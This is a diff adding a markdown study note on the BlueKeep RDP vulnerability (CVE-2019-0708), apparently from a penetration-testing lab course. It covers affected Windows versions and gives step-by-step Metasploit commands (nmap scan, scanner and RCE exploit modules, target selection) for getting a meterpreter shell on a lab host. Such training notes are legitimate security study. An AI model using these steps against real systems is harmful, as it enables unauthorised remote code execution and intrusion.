@@ -1,0 +1,26 @@
+RDP Vulnerabilities (BlueKeep)
+- Bluekeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
+- The Bluekeep vulnerabiliy was made public by Microsoft in May 2019.
+- The Bluekeep exploit takes advantages of a vulnerability in the Windows RDP protocol that allows attackers to again access to a chunk of kernal memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.
+- Microsoft patch this vulnerability on May 14th,2019.
+-The Bluekeep vulnerability affects multiple versions of windows
+- xp
+- vista
+- windows 7
+- windows server 2008 & R2
+- The BlueKeep vulnerability has various illegitimate Poc's and exploit and exploit code that could be malicious in nature.It is therefore recommended to only utilize verified exploit code and modules for exploitation
+- The Bluekeep exploit has an MSF auxiliary module as well as exploit modules 
+- MSF exploite module provides us with privileged meterpreter session on the target system.
+#### Exploit
+- sudo nmap -sV -sS 10.10.10.12 [ confirm the RDP services]
+- service postgresql start
+- msfconsole
+- search BlueKeep
+- use auxiliary/scanner/rdp/cve_2019_0708_bluekeep [ this will use for checking if the target is vulnerable or not]
+- use exploit/windows/rdp/cve_2019_0708_bluekeep_rce [ this will use for exploitation]
+- set everything requires
+- but this need to set targets
+- show targets [ this will list all the target]
+- set target 2 [ for setting specific target]
+- run
+- this will take couple of second and give meterpreter shell.
